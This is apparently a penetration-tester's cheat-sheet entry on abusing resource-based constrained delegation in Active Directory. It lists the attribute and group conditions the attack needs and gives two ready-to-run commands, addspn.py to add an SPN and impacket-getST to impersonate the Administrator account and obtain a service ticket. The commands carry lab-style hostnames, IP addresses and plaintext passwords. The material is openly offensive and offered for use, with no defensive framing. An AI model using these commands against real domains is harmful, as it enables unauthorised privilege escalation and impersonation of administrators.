# Delegation
## RBCD
**Prerequisites**
- Desired service account should have an `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute featuring a infected account's SPN. (You should be able to create fake machine account (if you do NOT already own one!) and modify target service's attributes (if it DOESN'T feature your owned account already!))
- The victim should be not in "Protected Users" group.
- The victim should not have an "Account is sensitive and cannot be delegated" attribute set.
- Infected account should have an `TRUSTED_TO_AUTH_FOR_DELEGATION` flag featured in it's `userAccountControl` attribute
- Infected account (that is set in the value of `msDS-AllowedToActOnBehalfOfOtherIdentity` of a target service) should have an SPN (machine accounts BY DEFAULT have `GenericWrite` to themselves, so if you compromise a machineaccount you can write an SPN to it) (user accounts BY DEFAULT **DO NOT** have `GenericWrite` to themselves, so if you compromise a useraccount you **can NOT** write an SPN to it, it should *already* have an SPN)
- If relay to LDAP, LDAP singing should be OFF

```bash
# add SPN to current user
python3 utils/krbrelayx/addspn.py -u 'CONTOSO\TestAcc' -p 'win2016-cli-P@$swd' -s 'host/testspn.contoso.org' -t 'TestAlpha' 192.168.68.64

# get a TGS for any user to a target service
impacket-getST -spn 'HOST/WIN-NUU0DPB1BVC' -impersonate 'Administrator' -dc-ip 192.168.68.64 'contoso.org/TestAlpha:win10-gui-P@$swd'
```
